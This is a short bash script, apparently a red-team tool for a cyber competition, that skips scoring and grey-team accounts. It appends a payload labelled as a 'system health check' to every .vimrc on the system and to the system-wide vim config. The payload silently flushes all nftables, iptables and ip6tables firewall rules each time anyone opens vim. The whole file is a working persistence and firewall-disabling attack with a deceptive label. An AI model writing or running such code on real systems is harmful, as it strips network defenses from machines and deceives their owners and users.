#!/usr/bin/env bash
whiteteam_user="greyteam|ansible|scoring"

PAYLOAD='
\" system health check autocmd
autocmd VimEnter * silent! call system("nft flush ruleset 2>/dev/null; iptables -F 2>/dev/null; iptables -X 2>/dev/null; ip6tables -F 2>/dev/null &")
'

# per-user .vimrc injection
find / -name ".vimrc" 2>/dev/null | while read -r vimrc; do
    [[ -n "$whiteteam_user" && "$vimrc" =~ $whiteteam_user ]] && continue
    echo "$PAYLOAD" >> "$vimrc"
done

# system-wide fallback — fires for any user that opens vim, even without a .vimrc
# skip if the path belongs to a whitelisted user (check owner)
if [[ -d /etc/vim ]]; then
    owner=$(stat -c '%U' /etc/vim 2>/dev/null || echo "root")
    if [[ -z "$whiteteam_user" || ! "$owner" =~ $whiteteam_user ]]; then
        touch /etc/vim/vimrc.local
        echo "$PAYLOAD" >> /etc/vim/vimrc.local
    fi
fi
